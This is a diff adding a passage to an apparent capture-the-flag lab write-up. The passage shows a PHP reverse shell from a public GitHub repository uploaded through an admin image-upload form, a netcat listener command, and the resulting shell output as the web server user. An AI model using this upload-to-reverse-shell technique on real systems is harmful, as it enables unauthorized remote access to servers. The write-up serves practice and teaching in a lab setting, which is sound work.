@@ -75,3 +75,25 @@ admin@10.10.105.174's password:
 Permission denied, please try again.
 admin@10.10.105.174's password: 
 ```
+Going back to the website, we can see that the admin account is able to upload image files, let's try and upload a reverse shell file injection instead.
+First let's find out win which directory the image is being uploaded by checking the profile picture.
+It looks like it's located at *IP*/v2/profileimages.
+Let's grab the following reverse shell php from GitHub, shoutout to Pentestmonkey.
+```Link https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php```
+Let's edit the file and replace the IP with ours, and then open a new terminal and run Netcat.
+```console
+┌─[zionglitch@parrot]─[~]
+└──╼ $nc -lvnp 1234
+listening on [any] 1234 ...
+```
+Now all we need to do is upload the php file on the Webpage and then go to the following link.
+```Link http://10.10.184.168/v2/profileimages/phpreverseshell.php```
+And BAM!
+```console 
+connect to [10.13.27.44] from (UNKNOWN) [10.10.184.168] 50762
+Linux sky 5.4.0-73-generic #82-Ubuntu SMP Wed Apr 14 17:39:42 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
+ 19:38:36 up 42 min,  0 users,  load average: 0.00, 0.00, 0.04
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+```
